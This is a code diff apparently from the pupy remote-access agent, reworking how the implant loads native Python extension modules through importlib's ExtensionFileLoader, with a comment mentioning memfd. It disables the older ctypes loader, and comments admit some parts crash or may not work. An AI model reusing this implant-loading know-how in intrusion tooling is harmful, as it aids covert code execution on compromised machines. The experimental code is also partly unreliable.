@@ -10,25 +10,24 @@ __all__ = (
     'load_library_common', '_Py_PackageContext'
 )
 
-import sys
 import importlib.util as imputil
 import ctypes
 
-from imp import load_dynamic
-
-from os import path, fsencode
+from os import path
 from tempfile import gettempdir
 
 import pupy.agent
 
 _Py_PackageContext = None
 
+
+"""
 try:
     _Py_PackageContext = ctypes.c_char_p.in_dll(
             ctypes.pythonapi, '_Py_PackageContext')
 except ValueError:
     pupy.agent.dprint('_Py_PackageContext not found in pythonapi')
-
+"""
 
 class package_context(object):
 
@@ -105,18 +104,22 @@ def load_library_common(
     module_name = name.split('.', 1)[-1]
 
     if initfuncname is None:
-        initfuncname = 'init' + module_name
+        initfuncname = 'PyInit_' + module_name.split("/")[-1]
 
-    if _Py_PackageContext is None:
-        # Fallback to built-in imp.load_dynamic
-        if initfuncname != 'init' + module_name:
-            raise ValueError('Unexpected module_name')
+    # use ExtensionFileLoader with memfd
+    module_name = module_name.split("/")[-1]
+    pupy.agent.dprint("loading {} with init {}", module_name, initfuncname)
 
-        x = load_dynamic(module_name, filepath)
-        pupy.agent.dprint(
-            'load_dynamic({}, {}) -> {}', module_name, filepath, x)
-        return x
+    import importlib.machinery
+    loader = importlib.machinery.ExtensionFileLoader(module_name, filepath)
+    spec = importlib.machinery.ModuleSpec(name=module_name, loader=loader, origin=filepath)
+    x=importlib._bootstrap._load(spec)
+    pupy.agent.dprint(
+        'load_dynamic({}, {}) -> {}', module_name, filepath, x)
+    return x
 
+    # this code does not work properly ?
+    """ 
     try:
         lib = ctypes.PyDLL(filepath)
         pupy.agent.dprint('load_library_common: Library loaded: {}', lib)
@@ -179,6 +182,11 @@ def load_library_common(
             PyModuleDef_Init = ctypes.pythonapi.PyModuleDef_Init
             PyModuleDef_Init.restypes = [ctypes.py_object]
             PyModuleDef_Init.argtypes = [ctypes.py_object]
+
+            PyModule_GetDef = ctypes.pythonapi.PyModule_GetDef
+            PyModule_GetDef.argtypes = [ctypes.py_object]
+            PyModule_GetDef.restypes = [ctypes.py_object]
+
             defmod = PyModuleDef_Init(m_ptr)
             pupy.agent.dprint('PyModuleDef_Init called: %s'%defmod)
 
@@ -189,19 +197,19 @@ def load_library_common(
                 PyModule_ExecDef = ctypes.pythonapi.PyModule_ExecDef
                 PyModule_ExecDef.argtypes = [ctypes.py_object, ctypes.c_void_p]
                 PyModule_ExecDef.restypes = [ctypes.c_int]
-                PyModule_GetDef = ctypes.pythonapi.PyModule_GetDef
-                PyModule_GetDef.argtypes = [ctypes.py_object]
-                PyModule_GetDef.restypes = [ctypes.c_void_p]
                 PyModule_GetState = ctypes.pythonapi.PyModule_GetState
                 PyModule_GetState.argtypes = [ctypes.py_object]
                 PyModule_GetState.restypes = [ctypes.c_void_p]
 
+                import _imp
+                import importlib.machinery
                 spec = imputil.spec_from_loader(module_name, loader=None)
-                module = PyModule_FromDefAndSpec(defmod, spec, 1013)
+                pupy.agent.dprint('spec: {}', spec)
+                module = _imp.create_dynamic(spec)#PyModule_FromDefAndSpec(defmod, spec, 1013)
                 pupy.agent.dprint('PyModule_FromDefAndSpec2 result: {}', module)
 
                 #    somehow, this is crashing ?? skiping this, not sure if it might cause issues
-
+                _imp.exec_dynamic(module)
                 #d=PyModule_GetDef(module)
                 #s=PyModule_GetState(module)
                 #pupy.agent.dprint('def: {} state: {}', d, s)
@@ -221,6 +229,8 @@ def load_library_common(
             pupy.agent.dprint("result: _PyImport_FixupExtensionObject {}", res)
             if res < 0:
                 raise ImportError("load_library_common: _PyImport_FixupExtensionObject failed")
+    """
+    
 
 
 
